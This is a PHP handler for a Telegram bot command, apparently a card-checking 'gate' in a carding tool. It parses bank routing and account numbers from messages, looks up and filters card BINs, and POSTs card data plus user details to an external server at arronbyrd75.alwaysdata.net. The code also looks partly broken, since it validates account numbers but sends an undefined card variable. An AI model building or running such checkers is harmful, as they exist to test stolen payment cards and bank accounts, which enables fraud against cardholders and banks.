<?php

use App\Gate\{Bin, CurlX};
use App\Models\{Bot, User};

$query = Bot::GetContent($message, strlen($cmd['cmd']) + 2);

$txt = $up['message']['reply_to_message']['text'] ?? $message;

$spam = "<b>λ Gate " . $cmd['name'] . "\nFormat:</b> <code>" . $t . $cmd['cmd'] . ' ' . $cmd['form'] . "</code>";
$spam .= (strlen($cmd['msg']) < 5) ? '' : "\n\n<b>📝Comment:</b> <i>" . $cmd['msg'] . "</i>";

preg_match_all('!\d+!', $txt, $reaba);
$routing = $reaba[0][0];
$account = $reaba[0][1];

if (empty($txt)) {
    Bot::SendMsg($chat_id, $spam, $message_id);
    exit;
}
if(strlen($routing) !== 9 || strlen($account) !== 8) {
    Bot::SendMsg($chat_id, "<i><b>⌧ ABA:</b> <code>INVALID</code>\n<b>⌧ Reason:</b></i> <u>The Account Number or Routing number is invalid</u> ⚠️" . $note, $message_id);
    exit;
}
$card = $cc['cc']['valid'][0]['cc'];

$antispam = User::AntiSpam($f);

if (!$antispam['ok']) {
    Bot::SendMsg($chat_id, $antispam['msg'].$note, $message_id);exit;
}

$fim = Bin::Get($card[0]);
if (!$fim['ok']) {
    Bot::SendMsg($chat_id, '<i>' . $fim['error'] . '</i>'.$note, $message_id);exit;
}if ($fim['banned']) {
    Bot::SendMsg($chat_id, '<b>⚠️</b> <i>Bin banned ➜ ' . $fim['bin'] . '</i>'.$note, $message_id);exit;
}

$f['chat_id'] = $chat_id;
$f['msg_id'] = $message_id;

$payload = json_encode(encode_gate($card, $fim, $f, $cmd));

User::UpdateLastCheck($f['id'], time());
$a = CurlX::Post('https://arronbyrd75.alwaysdata.net/kirari/public/gates/?'.http_build_query(['path' => $cmd['link']] ), $payload);
print_r($a);


function encode_gate(array $card, array $fim, array $user, array $cmd): array {
    return [
        'user' => $user,
        'gate' => $cmd,
        'ccs' => [
            [
                'cc' => $card,
                'bin' => $fim
            ]
        ]
    ];
}